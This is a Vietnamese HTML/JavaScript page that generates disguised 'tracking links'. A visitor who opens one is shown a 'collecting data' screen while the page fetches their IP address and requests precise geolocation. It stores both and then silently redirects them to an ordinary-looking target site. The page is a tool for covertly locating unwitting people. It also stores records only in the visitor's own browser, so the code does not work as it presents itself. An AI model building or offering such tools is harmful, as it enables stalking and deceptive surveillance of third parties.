<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Trình theo dõi vị trí + IP</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">

  <main class="container mx-auto p-4 max-w-xl">
    <h1 class="text-2xl font-semibold text-center text-blue-600 mb-4">
      Trình tạo liên kết theo dõi vị trí + IP
    </h1>
    <form id="linkForm" class="space-y-4 bg-white p-4 rounded shadow">
      <label class="block text-gray-700">Nhập URL đích:</label>
      <input
        type="url"
        id="linkInput"
        placeholder="https://flappybird.io"
        required
        class="w-full border border-gray-300 p-2 rounded"
      />
      <button type="submit" class="bg-blue-600 text-white py-2 px-4 rounded w-full">
        Tạo liên kết theo dõi
      </button>
    </form>

    <div id="generatedLinkContainer" class="mt-6 hidden bg-green-100 p-4 rounded">
      <p class="text-green-700 font-medium">Liên kết theo dõi của bạn:</p>
      <a id="generatedLink" href="#" class="text-blue-700 break-words underline" target="_blank"></a>
    </div>

    <div id="locationsList" class="mt-6 text-sm text-gray-700"></div>
  </main>

  <script>
    const STORAGE_KEY = 'trackedVisitors';

    function getStoredData() {
      const data = localStorage.getItem(STORAGE_KEY);
      try {
        return data ? JSON.parse(data) : [];
      } catch {
        return [];
      }
    }

    function saveVisitor(visitor) {
      const data = getStoredData();
      data.unshift(visitor);
      if (data.length > 50) data.pop();
      localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    }

    function renderLocations() {
      const data = getStoredData();
      const container = document.getElementById('locationsList');
      if (data.length === 0) {
        container.innerHTML = '<p class="text-center text-gray-500">Chưa có dữ liệu.</p>';
        return;
      }

      container.innerHTML = '<h2 class="text-lg font-semibold mb-2">Danh sách IP + Vị trí:</h2>';
      data.forEach((item, idx) => {
        const time = new Date(item.timestamp).toLocaleString();
        container.innerHTML += `
          <div class="mb-2 p-2 bg-white rounded shadow">
            <p>🕵️‍♂️ IP: <strong>${item.ip}</strong></p>
            <p>🌍 Vị trí: <strong>${item.latitude.toFixed(5)}, ${item.longitude.toFixed(5)}</strong></p>
            <p>🕒 Thời gian: ${time}</p>
          </div>`;
      });
    }

    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch {
        return 'Không xác định';
      }
    }

    async function trackVisitor() {
      const params = new URLSearchParams(window.location.search);
      const isTracking = params.get('track') === '1';
      const target = params.get('target');

      if (!isTracking || !target) {
        renderLocations();
        return;
      }

      document.body.innerHTML = `
        <div class="min-h-screen flex items-center justify-center flex-col bg-gray-50 p-6 text-center">
          <p class="text-lg font-medium text-gray-700 mb-2">Đang thu thập dữ liệu...</p>
          <p class="text-gray-500 text-sm">Vui lòng chờ trong giây lát</p>
        </div>`;

      const ip = await getIP();

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          saveVisitor({
            ip,
            latitude,
            longitude,
            timestamp: Date.now()
          });
          window.location.href = target;
        },
        (err) => {
          saveVisitor({
            ip,
            latitude: 0,
            longitude: 0,
            timestamp: Date.now()
          });
          window.location.href = target;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Tạo liên kết
    document.getElementById('linkForm').addEventListener('submit', (e) => {
      e.preventDefault();
      const input = document.getElementById('linkInput');
      const target = encodeURIComponent(input.value.trim());
      const base = window.location.origin + window.location.pathname;
      const trackURL = `${base}?track=1&target=${target}`;
      document.getElementById('generatedLink').textContent = trackURL;
      document.getElementById('generatedLink').href = trackURL;
      document.getElementById('generatedLinkContainer').classList.remove('hidden');
    });

    // Khởi chạy theo dõi nếu có
    trackVisitor();
  </script>
</body>
</html>
